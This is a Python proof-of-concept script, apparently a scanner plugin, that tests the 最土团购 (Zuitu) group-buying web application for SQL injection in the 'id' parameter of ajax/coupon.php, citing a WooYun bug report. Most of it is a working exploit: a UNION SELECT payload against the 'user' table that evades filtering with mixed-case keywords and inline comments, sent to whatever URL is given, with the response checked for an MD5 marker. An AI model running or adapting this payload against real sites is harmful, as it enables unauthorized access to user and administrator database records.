#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 最土团购SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-075525
author: Lucifer
description: 基础函数过滤不全导致注射。ajax/coupon.php文件id参数存在注入。
'''
import sys
import requests
import warnings
  
  

class coupon_id_sqli:
    def __init__(self, url):
        self.url = url

    def run(self):
        result = ['最土团购SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/ajax/coupon.php?action=consume&secret=8&id=2%27%29/**/AnD/**/1=2/**/UnIoN/**/SeLeCt/**/1,2,0,4,5,6,Md5(1234),8,9,10,11,9999999999,13,14,15,16/**/FrOm/**/user/**/WhErE/**/manager=0x59/**/LiMiT/**/0,1%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='未知'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = coupon_id_sqli(sys.argv[1])
    testVuln.run()